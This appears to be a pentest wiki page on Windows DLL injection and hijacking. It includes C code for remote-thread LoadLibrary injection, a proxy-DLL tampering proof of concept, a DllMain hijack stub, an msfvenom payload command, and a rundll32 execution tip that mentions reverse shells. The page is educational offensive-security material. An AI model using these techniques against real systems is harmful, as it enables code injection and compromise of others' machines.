# DLL Hijacking/Injection

## DLL Injection <a href="#loadlibrary" id="loadlibrary"></a>

* `DLL injection` is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. This technique allows the inserted code to run within the process's context, thereby influencing its behavior or accessing its resources.

### LoadLibrary <a href="#loadlibrary" id="loadlibrary"></a>

* `LoadLibrary` is a widely utilized method for DLL injection, employing the `LoadLibrary` API to load the DLL into the target process's address space.
* The `LoadLibrary` API is a function provided by the Windows operating system that loads a Dynamic Link Library (DLL) into the current process’s memory and returns a handle that can be used to get the addresses of functions within the DLL.

<details>

<summary><strong>Scripts</strong></summary>

{% code lineNumbers="true" %}
```c
// LoadLibrary can be used to load a DLL into the current process legitimately.
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
```
{% endcode %}

{% code lineNumbers="true" %}
```c
// Use of LoadLibrary for DLL injection, involves allocating memory within the 
// target process for the DLL path and then initiating a remote thread that begins
// at LoadLibrary and directs towards the DLL path.
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}

```
{% endcode %}



</details>

### Manual Mapping

* `Manual Mapping` is an incredibly complex and advanced method of DLL injection. It involves the manual loading of a DLL into a process's memory and resolves its imports and relocations.
* **WorkFlow**
  1. Load the DLL as raw data into the injecting process.
  2. Map the DLL sections into the targeted process.
  3. Inject shellcode into the target process and execute it. This shellcode relocates the DLL, rectifies the imports, executes the Thread Local Storage (TLS) callbacks, and finally calls the DLL main.

### Reflective DLL Injection

* `Reflective DLL injection` is a technique that utilizes reflective programming to load a library from memory into a host process. The library itself is responsible for its loading process by implementing a minimal Portable Executable (PE) file loader.
* Allows it to decide how it will load and interact with the host, minimising interaction with the host system and process.
* **WorkFlow**
  1. Execution control is transferred to the library's `ReflectiveLoader` function, an exported function found in the library's export table. This can happen either via `CreateRemoteThread()` or a minimal bootstrap shellcode.
  2. As the library's image currently resides in an arbitrary memory location, the `ReflectiveLoader` initially calculates its own image's current memory location to parse its own headers for later use.
  3. The `ReflectiveLoader` then parses the host process's `kernel32.dll` export table to calculate the addresses of three functions needed by the loader, namely `LoadLibraryA`, `GetProcAddress`, and `VirtualAlloc`.
  4. The `ReflectiveLoader` now allocates a continuous memory region where it will proceed to load its own image. The location isn't crucial; the loader will correctly relocate the image later.
  5. The library's headers and sections are loaded into their new memory locations.
  6. The `ReflectiveLoader` then processes the newly loaded copy of its image's import table, loading any additional libraries and resolving their respective imported function addresses.
  7. The `ReflectiveLoader` then processes the newly loaded copy of its image's relocation table.
  8. The `ReflectiveLoader` then calls its newly loaded image's entry point function, `DllMain,` with `DLL_PROCESS_ATTACH`. The library has now been successfully loaded into memory.
  9. Finally, the `ReflectiveLoader` returns execution to the initial bootstrap shellcode that called it, or if it were called via `CreateRemoteThread`, the thread would terminate."

## DLL Hijacking

* `DLL Hijacking` is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL, hence rendering it susceptible to such attacks.
* To Enable or Dsiable `SafeDllSearchMode`
  1. Press `Windows key + R` to open the Run dialog box.
  2. Type in `Regedit` and press `Enter`. This will open the Registry Editor.
  3. Navigate to `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager`.
  4. In the right pane, look for the `SafeDllSearchMode` value. If it does not exist, right-click the blank space of the folder or right-click the `Session Manager` folder, select `New` and then `DWORD (32-bit) Value`. Name this new value as `SafeDllSearchMode`.
  5. Double-click `SafeDllSearchMode`. In the Value data field, enter `1` to enable and `0` to disable Safe DLL Search Mode.
  6. Click `OK`, close the Registry Editor and Reboot the system for the changes to take effect.

<details>

<summary><strong>DLL Load Order</strong></summary>

* When `SafeDllSearchMode` Enabled
  1. The directory from which the application is loaded.
  2. The system directory.
  3. The 16-bit system directory.
  4. The Windows directory.
  5. The current directory.
  6. The directories that are listed in the PATH environment variable.
* When `SafeDllSearchMode` Disabled
  1. The directory from which the application is loaded.
  2. The current directory.
  3. The system directory.
  4. The 16-bit system directory.
  5. The Windows directory
  6. The directories that are listed in the PATH environment variable

</details>

### Identify the DLL's

1. `Process Explorer`: Part of Microsoft's Sysinternals suite, this tool offers detailed information on running processes, including their loaded DLLs. By selecting a process and inspecting its properties, you can view its DLLs.
2. `PE Explorer`: This Portable Executable (PE) Explorer can open and examine a PE file (such as a .exe or .dll). Among other features, it reveals the DLLs from which the file imports functionality.

### Methods to Exploit

#### Proxying

* An example below where a main.exe app loads a library.dll which contains the logic to add 2 numbers.
* We will create a new library that will load the function `Add` from `library.dll`, tamper with it, and then return it to `main.exe`.
  1. Create a new library: We will create a new library serving as the proxy for `library.dll`. This library will contain the necessary code to load the `Add` function from `library.dll` and perform the required tampering.
  2. Load the `Add` function: Within the new library, we will load the `Add` function from the original `library.dll`. This will allow us to access the original function.
  3. Tamper with the function: Once the `Add` function is loaded, we can then apply the desired tampering or modifications to its result. In this case, we are simply going to modify the result of the addition, to add `+ 1` to the result.
  4. Return the modified function: After completing the tampering process, we will return the modified `Add` function from the new library back to `main.exe`. This will ensure that when `main.exe` calls the `Add` function, it will execute the modified version with the intended changes.
  5. Rename orginal library.dll to library.o.dll, and rename tamper.dll to library.dll.

<details>

<summary><strong>POC</strong></summary>

{% code lineNumbers="true" %}
```c
// tamper.c
#include <stdio.h>
#include <Windows.h>

#ifdef _WIN32
#define DLL_EXPORT __declspec(dllexport)
#else
#define DLL_EXPORT
#endif

typedef int (*AddFunc)(int, int);

DLL_EXPORT int Add(int a, int b)
{
    // Load the original library containing the Add function
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        // Get the address of the original Add function from the library
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            printf("============ HIJACKED ============\n");
            // Call the original Add function with the provided arguments
            int result = originalAdd(a, b);
            // Tamper with the result by adding +1
            printf("= Adding 1 to the sum to be evil\n");
            result += 1;
            printf("============ RETURN ============\n");
            // Return the tampered result
            return result;
        }
    }
    // Return -1 if the original library or function cannot be loaded
    return -1;
}

```
{% endcode %}

</details>

#### Invalid Libraries <a href="#invalid-libraries" id="invalid-libraries"></a>

* Application attempting to load a DLL but cannot find it anywhere.
* **Procmon** : Filters ->  `Process Name contains "Process Name"` -> `Path ends with ".DLL"` -> `Result is "NAME NOT FOUND"`&#x20;
* Compile below POC  or use DLL Zip files and rename it to which the app searches for within the directory.
* **MsfVenom** : `msfvenom -p windows/exec CMD="C:\windows\system32\calc.exe" -f dll -a x84 -o calc.dll`&#x20;

<details>

<summary><strong>POC</strong></summary>

{% code lineNumbers="true" %}
```c
// Defines a DLL entry point function called DllMain that is automatically called by Windows when the DLL is loaded into a process. When the library is loaded, it will simply print Hijacked... Oops... to the terminal
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        printf("Hijacked... Oops...\n");
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```
{% endcode %}

</details>

## Execute DLL's

* A binary such as [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) can be used to execute a DLL file. We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.
* **Find Exported functions**
  * `dumpbin /exports test.dll` <sup><sub>(VS Studio Tool)<sub></sup>
  * `link /dump /exports test.dll`
  * `$obj = [System.Reflection.Assembly]::LoadFile((Resolve-Path ".\test.dll"))`
  * `sigcheck -e test.dll`
  * Use PE-bear (GUI) -> Open the DLL and select Exports.
* `rundll32.exe test.dll,ExportedFunction`

{% file src="../.gitbook/assets/DLL Files.zip" %}

#### Tools

* [DLLSpy](https://github.com/cyberark/DLLSpy)
* [siofra](https://github.com/Cybereason/siofra)

#### References

* [Siofra-Research-Tool-Cybereason.pdf](https://www.cybereason.com/hubfs/Siofra-Research-Tool-Cybereason.pdf)
